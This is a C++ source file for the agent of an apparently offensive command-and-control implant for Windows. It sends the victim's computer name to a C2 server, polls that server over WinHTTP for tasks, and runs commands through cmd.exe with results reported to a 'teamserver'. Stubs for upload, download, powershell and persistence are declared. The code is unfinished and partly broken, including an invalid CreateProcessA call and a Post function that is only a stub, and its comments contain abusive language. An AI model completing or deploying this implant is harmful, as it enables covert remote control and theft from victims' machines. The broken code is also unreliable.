#include "Agent.h"


void Agent::Register(std::string ip, unsigned int port) {
	const int buffer_size = MAX_COMPUTERNAME_LENGTH + 1;
	char buffer[buffer_size];
	DWORD lpnSize = buffer_size;

	if (GetComputerNameA(buffer, &lpnSize) == FALSE)
		throw std::runtime_error("Something went wrong.");
	ComputerName = std::string{ buffer };


	Post(RETURN_URI, "?comp=" + ComputerName);
}


std::string Agent::Get(std::wstring path) {
	// path = path + "/" + AgentID + "/"
	std::string result = "";

	HINTERNET hSession, hConnect, hRequest;
	BOOL bResults = FALSE;
	DWORD sSize = 0;


	hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	
	if (!hSession) {
		return result;
	}

	hConnect = WinHttpConnect(hSession, C2_IP, C2_PORT, 0);

	if (!hConnect) {
		return result;
	}

	hRequest = WinHttpOpenRequest(hConnect, L"GET", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

	if (!hRequest) {
		return result;
	}

	bResults = WinHttpSendRequest(hRequest,	WINHTTP_NO_ADDITIONAL_HEADERS,	0, WINHTTP_NO_REQUEST_DATA, 0,	0, 0);

	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);
	


	return result;
}

std::string Agent::Post(std::string path, std::string data) {
	//ENCODE DATA
	// path = path + "/" + AgentID + "/"
	return "POST func";
}


//re-write this bullshit, each command in own class.

void Agent::shell(std::vector<std::string> args) {
	if (args.size() == 0) {
		//Post(RETURN_PATH, error="No Arguments you fucking retard.");
		return;
	}

	HANDLE hRead, hWrite;
	STARTUPINFO si;
	PROCESS_INFORMATION pi = { 0 };
	SECURITY_ATTRIBUTES saAttr;

	ZeroMemory(&saAttr, sizeof(saAttr));

	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&hRead, &hWrite, &saAttr, 0)) {
		//Post(RETURN_URL, GetLastError());
		return;// send error back to teamserver
	}
	std::string cmd = "cmd.exe /c ";

	if (!CreateProcessA(NULL, cmd.c_str())) {
		//Post(RETURN_URL, GetLastError());// send error back to teamserver
		CloseHandle(hRead);
		CloseHandle(hWrite);
		return;
	}


}
void Agent::powershell(std::vector<std::string> args) {

}
void Agent::upload(std::vector<std::string> args) {

}
void Agent::download(std::vector<std::string> args) {

}
void Agent::persist(std::vector<std::string> args) {

}
void Agent::listdir(std::vector<std::string> args) {

}